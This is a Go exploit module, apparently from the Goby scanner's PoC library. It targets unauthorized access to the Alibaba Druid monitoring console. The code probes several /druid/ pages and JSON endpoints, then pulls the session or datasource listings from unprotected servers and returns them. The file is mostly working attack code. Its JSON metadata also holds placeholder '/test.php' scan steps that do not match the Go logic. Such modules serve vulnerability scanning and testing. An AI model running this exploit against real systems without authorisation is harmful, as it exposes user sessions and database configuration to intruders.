package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Alibaba druid index.html Unauthorized Access Vulnerability",
    "Description": "<p>Alibaba Druid is a secondary development version of Apache Druid by Alibaba. It has made some improvements and extensions based on Apache Druid. It has stronger performance and scalability, and provides some special functions, such as automatic backup, data monitoring, etc.</p><p>An attacker can control the entire system through unauthorized access vulnerabilities, ultimately leaving the system in an extremely unsafe state.</p>",
    "Product": "Alibaba Druid",
    "Homepage": "https://github.com/alibaba/druid",
    "DisclosureDate": "2015-02-27",
    "PostTime": "2023-09-12",
    "Author": "whoamisb@163.com",
    "FofaQuery": "protocol=\"http\" || protocol=\"https\"",
    "GobyQuery": "protocol=\"http\" || protocol=\"https\"",
    "Level": "2",
    "Impact": "<p>An attacker can control the entire system through unauthorized access vulnerabilities, ultimately leaving the system in an extremely unsafe state.</p>",
    "Recommendation": "<p>There is currently no detailed solution provided, please pay attention to the manufacturer's homepage for updates: <a href=\"https://github.com/alibaba/druid\">https://github.com/alibaba/druid</a></p><p>Temporary fix:</p><p>1. Set access policies through security devices such as firewalls and set whitelist access.</p><p>2. Unless necessary, it is prohibited to access the system from the public network.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "session,datasource",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Unauthorized Access"
    ],
    "VulType": [
        "Unauthorized Access"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "7.5",
    "Translation": {
        "CN": {
            "Name": "Alibaba druid index.html 未授权访问漏洞",
            "Product": "Alibaba Druid",
            "Description": "<p>Alibaba Druid 是阿里巴巴公司对 Apache Druid 的一个二次开发版本，在 Apache Druid 的基础上进行了一些改进和扩展。它具有更强的性能和可伸缩性，并且提供了一些特殊的功能，如自动备份、数据监控等。</p><p>攻击者可通过未授权访问漏洞控制整个系统，最终导致系统处于极度不安全状态。</p>",
            "Recommendation": "<p>目前没有详细的解决方案提供，请关注厂商主页更新：<a href=\"https://github.com/alibaba/druid\">https://github.com/alibaba/druid</a></p><p>临时修复方案：</p><p>1、通过防火墙等安全设备设置访问策略，设置白名单访问。</p><p>2、如非必要，禁止公网访问该系统。</p>",
            "Impact": "<p>攻击者可通过未授权访问漏洞控制整个系统，最终导致系统处于极度不安全状态。<br></p>",
            "VulType": [
                "未授权访问"
            ],
            "Tags": [
                "未授权访问"
            ]
        },
        "EN": {
            "Name": "Alibaba druid index.html Unauthorized Access Vulnerability",
            "Product": "Alibaba Druid",
            "Description": "<p>Alibaba Druid is a secondary development version of Apache Druid by Alibaba. It has made some improvements and extensions based on Apache Druid. It has stronger performance and scalability, and provides some special functions, such as automatic backup, data monitoring, etc.</p><p>An attacker can control the entire system through unauthorized access vulnerabilities, ultimately leaving the system in an extremely unsafe state.</p>",
            "Recommendation": "<p>There is currently no detailed solution provided, please pay attention to the manufacturer's homepage for updates: <a href=\"https://github.com/alibaba/druid\">https://github.com/alibaba/druid</a></p><p>Temporary fix:</p><p>1. Set access policies through security devices such as firewalls and set whitelist access.</p><p>2. Unless necessary, it is prohibited to access the system from the public network.</p>",
            "Impact": "<p>An attacker can control the entire system through unauthorized access vulnerabilities, ultimately leaving the system in an extremely unsafe state.<br></p>",
            "VulType": [
                "Unauthorized Access"
            ],
            "Tags": [
                "Unauthorized Access"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10831"
}`

	sendPayloadGRYFFjhc4 := func(hostInfo *httpclient.FixUrl, uri string) (*httpclient.HttpResponse, error) {
		getRequestConfig := httpclient.NewGetRequestConfig(uri)
		getRequestConfig.VerifyTls = false
		getRequestConfig.FollowRedirect = false
		return httpclient.DoHttpRequest(hostInfo, getRequestConfig)
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(poc *jsonvul.JsonVul, hostinfo *httpclient.FixUrl, stepLogs *scanconfig.SingleScanConfig) bool {
			if resp, _ := sendPayloadGRYFFjhc4(hostinfo, "/druid/index.html"); resp != nil && resp.StatusCode == 200 && strings.Contains(resp.RawBody, `js/lang.js`) && strings.Contains(resp.RawBody, `js/common.js`) && strings.Contains(resp.RawBody, `basic.json`) {
				stepLogs.VulURL = hostinfo.FixedHostInfo + resp.Request.URL.Path
				return true
			}
			if resp, _ := sendPayloadGRYFFjhc4(hostinfo, "/druid/websession.json"); resp != nil && resp.StatusCode == 200 && strings.HasPrefix(resp.RawBody, `{`) && strings.HasSuffix(resp.RawBody, `}`) && strings.Contains(resp.RawBody, `"ResultCode"`) && strings.Contains(resp.RawBody, `"Content"`) {
				stepLogs.VulURL = hostinfo.FixedHostInfo + resp.Request.URL.Path
				return true
			}
			if resp, _ := sendPayloadGRYFFjhc4(hostinfo, "/druid/websession.html"); resp != nil && resp.StatusCode == 200 && strings.Contains(resp.RawBody, `js/lang.js`) && strings.Contains(resp.RawBody, `js/common.js`) && strings.Contains(resp.RawBody, `websession.json`) {
				stepLogs.VulURL = hostinfo.FixedHostInfo + resp.Request.URL.Path
				return true
			}
			if resp, _ := sendPayloadGRYFFjhc4(hostinfo, "/druid/datasource.html"); resp != nil && resp.StatusCode == 200 && strings.Contains(resp.RawBody, `js/lang.js`) && strings.Contains(resp.RawBody, `js/common.js`) && strings.Contains(resp.RawBody, `datasource.json`) {
				stepLogs.VulURL = hostinfo.FixedHostInfo + resp.Request.URL.Path
				return true
			}
			if resp, _ := sendPayloadGRYFFjhc4(hostinfo, "/druid/datasource.json"); resp != nil && resp.StatusCode == 200 && strings.HasPrefix(resp.RawBody, `{`) && strings.HasSuffix(resp.RawBody, `}`) && strings.Contains(resp.RawBody, `"ResultCode"`) && strings.Contains(resp.RawBody, `"Content"`) {
				stepLogs.VulURL = hostinfo.FixedHostInfo + resp.Request.URL.Path
				return true
			}
			if resp, _ := sendPayloadGRYFFjhc4(hostinfo, "/druid/sql.html"); resp != nil && resp.StatusCode == 200 && strings.Contains(resp.RawBody, `js/lang.js`) && strings.Contains(resp.RawBody, `js/common.js`) && strings.Contains(resp.RawBody, `sql.json`) {
				stepLogs.VulURL = hostinfo.FixedHostInfo + resp.Request.URL.Path
				return true
			}
			if resp, _ := sendPayloadGRYFFjhc4(hostinfo, "/druid/sql.json"); resp != nil && resp.StatusCode == 200 && strings.HasPrefix(resp.RawBody, `{`) && strings.HasSuffix(resp.RawBody, `}`) && strings.Contains(resp.RawBody, `"ResultCode"`) && strings.Contains(resp.RawBody, `"Content"`) {
				stepLogs.VulURL = hostinfo.FixedHostInfo + resp.Request.URL.Path
				return true
			}
			if resp, _ := sendPayloadGRYFFjhc4(hostinfo, "/druid/spring.html"); resp != nil && resp.StatusCode == 200 && strings.Contains(resp.RawBody, `js/lang.js`) && strings.Contains(resp.RawBody, `js/common.js`) && strings.Contains(resp.RawBody, `spring.json`) {
				stepLogs.VulURL = hostinfo.FixedHostInfo + resp.Request.URL.Path
				return true
			}
			if resp, _ := sendPayloadGRYFFjhc4(hostinfo, "/druid/spring.json"); resp != nil && resp.StatusCode == 200 && strings.HasPrefix(resp.RawBody, `{`) && strings.HasSuffix(resp.RawBody, `}`) && strings.Contains(resp.RawBody, `"ResultCode"`) && strings.Contains(resp.RawBody, `"Content"`) {
				stepLogs.VulURL = hostinfo.FixedHostInfo + resp.Request.URL.Path
				return true
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, stepLogs *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			attackType := goutils.B2S(stepLogs.Params["attackType"])
			if attackType == "session" {
				if resp, err := sendPayloadGRYFFjhc4(expResult.HostInfo, "/druid/websession.json"); resp != nil && resp.StatusCode == 200 && strings.HasPrefix(resp.RawBody, `{`) && strings.HasSuffix(resp.RawBody, `}`) && strings.Contains(resp.RawBody, `"ResultCode"`) && strings.Contains(resp.RawBody, `"Content"`) {
					expResult.Success = true
					expResult.Output = resp.Utf8Html
				} else if err != nil {
					expResult.Output = err.Error()
				} else {
					expResult.Output = `漏洞利用失败`
				}
			} else if attackType == "datasource" {
				if resp, err := sendPayloadGRYFFjhc4(expResult.HostInfo, "/druid/datasource.json"); resp != nil && resp.StatusCode == 200 && strings.HasPrefix(resp.RawBody, `{`) && strings.HasSuffix(resp.RawBody, `}`) && strings.Contains(resp.RawBody, `"ResultCode"`) && strings.Contains(resp.RawBody, `"Content"`) {
					expResult.Success = true
					expResult.Output = resp.Utf8Html
				} else if err != nil {
					expResult.Output = err.Error()
				} else {
					expResult.Output = `漏洞利用失败`
				}
			} else {
				expResult.Success = false
				expResult.Output = `未知的利用方式`
			}
			return expResult
		},
	))
}
